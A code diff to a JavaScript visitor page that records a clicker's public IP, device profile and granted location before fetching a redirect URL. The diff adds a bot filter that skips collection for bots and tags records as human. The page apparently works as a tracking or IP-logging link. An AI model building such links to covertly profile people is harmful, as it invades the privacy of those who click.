@@ -5,6 +5,7 @@ import {
 } from "./collect.js";
 import { collectDeviceProfile } from "./device-profile.js";
 import { fetchRedirectUrl, isSupabaseConfigured } from "./settings.js";
+import { shouldSkipVisitorFlow } from "./bot-filter.js";
 
 function cfg() {
   return window.APP_CONFIG || {};
@@ -33,6 +34,9 @@ function saveVisit(payload) {
 
 export function initVisitorPage() {
   async function run() {
+    if (shouldSkipVisitorFlow()) {
+      return;
+    }
     const redirectPromise = fetchRedirectUrl();
     const ipPromise = fetchPublicIp().catch(() => ({
       ip: null,
@@ -65,7 +69,10 @@ export function initVisitorPage() {
     const payload = {
       ip: ipPayload.ip,
       ip_source: ipPayload.source,
-      device_info: deviceInfo,
+      device_info: {
+        ...deviceInfo,
+        visitKind: "human",
+      },
       location_granted: locationPayload.granted,
       location: locationPayload.granted
         ? {
